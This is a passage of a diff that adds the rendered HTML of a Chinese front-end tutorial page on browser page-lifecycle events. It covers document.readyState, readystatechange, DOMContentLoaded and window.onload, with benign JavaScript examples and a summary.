+<span class="token punctuation">}</span><span class="token punctuation">;</span>
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p>你也可以单击以下 <code>&lt;iframe&gt;</code> 中的按钮来设置处理器，然后单击链接：</p> <iframe data-trusted="1" src="https://zh.js.cx/article/onload-ondomcontentloaded/window-onbeforeunload/" class="code-result__iframe" style="display:block;border:0px;width:531.354px;height:80px;"></iframe> <h2 id="readystate"><a href="#readystate" aria-hidden="true" class="header-anchor">#</a> <a href="https://zh.javascript.info/onload-ondomcontentloaded#readystate" target="_blank" rel="noopener noreferrer">readyState<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></h2> <p>如果在加载文档之后设置 <code>DOMContentLoaded</code> 处理器会发生什么？</p> <p>很自然地，它从未运行过。</p> <p>在某些情况下，我们不确定文档是否已经准备就绪，比如一个具有 <code>async</code> 属性的脚本加载并异步运行。取决于网络，它可能在文档完成之前加载和执行，或者在此之后，我们无法确定。因此，我们应该能够知道文件的当前状态。</p> <p><code>document.readyState</code> 属性为我们提供了一些关于它的信息。有三个可能的值：</p> <ul><li><code>&quot;loading&quot;</code> —— 文档正在被加载。</li> <li><code>&quot;interactive&quot;</code> —— 文档被全部读取。</li> <li><code>&quot;complete&quot;</code> —— 文档被全部读取，所有的资源（图像之类的）都被加载。</li></ul> <p>因此我们检查 <code>document.readyState</code> 并设置一个处理器，或在代码准备就绪时立即执行它。</p> <p>就像这样：</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">function</span> <span class="token function">work</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment">/*...*/</span> <span class="token punctuation">}</span>
+
+<span class="token keyword">if</span> <span class="token punctuation">(</span>document<span class="token punctuation">.</span>readyState <span class="token operator">==</span> <span class="token string">'loading'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+  document<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'DOMContentLoaded'</span><span class="token punctuation">,</span> work<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+  <span class="token function">work</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><p>有一个 <code>readystatechange</code> 事件，当状态发生变化时触发，因此我们可以打印如下所有这些状态：</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token comment">// current state</span>
+console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>readyState<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token comment">// print state changes</span>
+document<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'readystatechange'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>readyState<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><p><code>readystatechange</code> 事件是跟踪文档加载状态的另一种机制，它很早就存在了。现在则很少被使用，但我们还是需要来讨论一下它的完整性。</p> <p><code>readystatechange</code> 在其他事件中的地位？</p> <p>要查看时间，这里有一个带有 <code>&lt;iframe&gt;</code>、<code>&lt;img&gt;</code> 和记录事件的处理器：</p> <div class="language-markup line-numbers-mode"><pre class="language-markup"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script language-javascript">
+  <span class="token keyword">function</span> <span class="token function">log</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment">/* output the time and message */</span> <span class="token punctuation">}</span>
+  <span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'initial readyState:'</span> <span class="token operator">+</span> document<span class="token punctuation">.</span>readyState<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+  document<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'readystatechange'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'readyState:'</span> <span class="token operator">+</span> document<span class="token punctuation">.</span>readyState<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  document<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'DOMContentLoaded'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'DOMContentLoaded'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+  window<span class="token punctuation">.</span><span class="token function-variable function">onload</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'window onload'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
+
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>iframe.html<span class="token punctuation">&quot;</span></span> <span class="token attr-name">onload</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>log(<span class="token punctuation">'</span>iframe onload<span class="token punctuation">'</span>)<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">&gt;</span></span>
+
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>http://en.js.cx/clipart/train.gif<span class="token punctuation">&quot;</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>img<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script language-javascript">
+  img<span class="token punctuation">.</span><span class="token function-variable function">onload</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'img onload'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br></div></div><p><a href="https://plnkr.co/edit/zia9iE8JAhcIpBOXqxAb?p=preview" target="_blank" rel="noopener noreferrer">在 sandbox<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a> 中的运行示例。</p> <p>典型输出：</p> <ol><li>[1] initial readyState:loading</li> <li>[2] readyState:interactive</li> <li>[2] DOMContentLoaded</li> <li>[3] iframe onload</li> <li>[4] readyState:complete</li> <li>[4] img onload</li> <li>[4] window onload</li></ol> <p>方括号中的数字表示发生这种情况的大致时间。实际时间会长一些，但标记为相同数字的事件几乎是同时发生的（± 几毫秒）。</p> <ul><li><code>document.readyState</code> 在 <code>DOMContentLoaded</code> 之前会立即变成了 <code>interactive</code>。这两个事件的意义没有任何差别。</li> <li>当所有资源（<code>iframe</code> 和 <code>img</code>）都被加载后，<code>document.readyState</code> 变成了 <code>complete</code>。这里我们可以发现，它大约发生在 <code>img.onload</code> (<code>img</code> 是最后的资源) 和 <code>window.onload</code> 之间。转换到 <code>complete</code> 状态的意义与 <code>window.onload</code>一致。区别在于 <code>window.onload</code> 在所有其他 <code>load</code> 处理器之后一直有效。</li></ul> <h2 id="总结"><a href="#总结" aria-hidden="true" class="header-anchor">#</a> <a href="https://zh.javascript.info/onload-ondomcontentloaded#zong-jie" target="_blank" rel="noopener noreferrer">总结<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></h2> <p>页面生命周期事件：</p> <ul><li><p>当 DOM 准备就绪时，</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>DOMContentLoaded
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>事件就会在</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>document
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>上触发。在这个阶段，我们可以将 JavaScript 应用于元素。</p> <ul><li>除了 <code>async</code> 或 <code>defer</code> 的脚本外，所有的脚本都会被执行。</li> <li>图像和其他资源仍然可以继续被加载。</li></ul></li> <li><p>当页面和所有资源被加载时，<code>load</code> 事件会在 <code>window</code> 上被触发。我们很少使用它，因为通常没有必要去等待那么久。</p></li> <li><p>当用户想要离开页面时，<code>beforeunload</code> 事件会在 <code>window</code> 上被触发。如果他返回一个字符串，那么浏览器就会以问题的形式向用户确认是否真的要离开。</p></li> <li><p>当用户最终离开时，<code>unload</code> 事件会在 <code>window</code> 上被触发，在处理器中，我们只能做一些简单的事情，不会涉及到延迟或询问用户。正是由于这个限制，它很少被使用。</p></li> <li><div class="language- line-numbers-mode"><pre class="language-text"><code>document.readyState
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>是文档的当前状态，可以在</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>readystatechange
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>事件中跟踪变更：</p> <ul><li><code>loading</code> —— 文档正在被加载。</li> <li><code>interactive</code> —— 文档被解析，大概是与 <code>DOMContentLoaded</code> 同时发生，而不是在它之前发生。</li> <li><code>complete</code> —— 文档和资源被加载，与 <code>window.onload</code> 同时发生，而不是在它之前发生。</li></ul></li></ul> <p>&lt;&gt;</p> <h2 id="浏览器存储-2"><a href="#浏览器存储-2" aria-hidden="true" class="header-anchor">#</a> 浏览器存储</h2> <p><a href="https://developers.google.com/web/fundamentals/instant-and-offline/web-storage/offline-for-pwa?hl=zh-cn" target="_blank" rel="noopener noreferrer">各种存储对比<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></p> <p><a href="https://github.com/youngwind/blog/issues/113" target="_blank" rel="noopener noreferrer">https://github.com/youngwind/blog/issues/113<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></p></div> <footer class="page-edit"><div class="edit-link"><a href="https://github.com/jinjun1994/Frontend-Knowledge-Base/edit/master/frontend/browser/browser.md" target="_blank" rel="noopener noreferrer">帮助我们改善此页面！</a> <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></div> <div class="last-updated"><span class="prefix">Last Updated: </span> <span class="time">2019/3/17 下午3:49:35</span></div></footer> <div class="page-nav"><p class="inner"><span class="prev">
+        ←
+        <a href="/Frontend-Knowledge-Base/frontend/html/html.html" class="prev">
+          html
+        </a></span> <span class="next"><a href="/Frontend-Knowledge-Base/frontend/framework/framework.html">
+          三大框架
+        </a>
+        →
+      </span></p></div> </main> <div class="page"><section class="page-edit"><h3 style="display:;"><a href="javascript:;"></a>
+      评 论：
+    </h3> <div id="vcomments"></div></section></div></div><div class="global-ui"><!----></div></div>
+    <script src="/Frontend-Knowledge-Base/assets/js/app.be30c89b.js" defer></script><script src="/Frontend-Knowledge-Base/assets/js/4.d5d74749.js" defer></script><script src="/Frontend-Knowledge-Base/assets/js/53.ffdc0ead.js" defer></script><script src="/Frontend-Knowledge-Base/assets/js/9.1a9c75bd.js" defer></script>
+  </body>
+</html>
